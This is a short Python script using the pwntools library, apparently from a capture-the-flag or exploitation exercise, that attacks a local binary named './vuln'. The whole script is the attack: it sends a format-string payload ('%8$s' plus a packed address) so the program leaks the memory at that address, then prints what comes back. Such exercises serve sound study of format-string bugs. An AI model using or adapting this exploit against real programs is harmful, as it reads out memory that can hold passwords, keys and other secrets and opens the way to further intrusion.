from pwn import *

elf = context.binary = ELF('./vuln')
io = process()

payload = b'%8$s||||'
payload += p32(0x8048000)


io.sendline(payload)
log.info(io.clean())